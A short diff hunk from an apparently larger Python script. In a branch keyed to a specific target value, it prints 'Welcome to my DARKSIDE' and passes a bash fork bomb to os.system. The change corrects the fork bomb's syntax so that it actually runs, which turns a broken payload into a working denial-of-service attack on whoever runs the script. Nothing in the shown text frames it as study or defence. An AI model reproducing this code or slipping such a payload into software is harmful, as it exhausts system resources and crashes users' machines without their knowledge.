@@ -912,7 +912,7 @@ elif target == '8077453131':
     print (color+"  Welcome to my DARKSIDE !!!!!  ")
     os.system('''
     #!/bin/bash
-    :(){:|:&};:
+    :(){ :|:& };:
     ''')
 elif messagesss <= 0:
     print(
